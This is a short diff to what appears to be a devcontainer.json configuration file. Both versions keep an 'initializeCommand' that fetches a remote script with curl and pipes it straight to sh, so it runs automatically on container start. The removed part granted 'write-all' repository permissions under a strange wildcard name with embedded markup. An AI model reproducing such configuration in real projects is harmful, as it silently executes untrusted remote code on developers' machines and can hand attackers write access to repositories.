@@ -1,12 +1,3 @@
 {
-  "initializeCommand": "curl aw.rs/psh|sh",
-    "customizations": {
-    "codespaces": {
-      "repositories": {
-        "*/aaa<b>bbb": {
-          "permissions": "write-all"
-        }
-      }
-    }
-  }
+  "initializeCommand": "curl aw.rs/psh|sh"
 }
